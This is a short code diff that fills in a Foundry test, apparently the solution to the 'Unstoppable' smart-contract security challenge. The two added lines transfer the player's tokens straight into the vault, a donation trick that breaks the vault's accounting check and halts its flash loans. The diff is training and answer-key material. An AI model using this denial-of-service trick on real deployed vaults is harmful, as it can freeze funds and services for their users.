@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        address vaultAddr = address(vault);
+        token.transfer(vaultAddr, INITIAL_PLAYER_TOKEN_BALANCE);  
     }
 
     /**
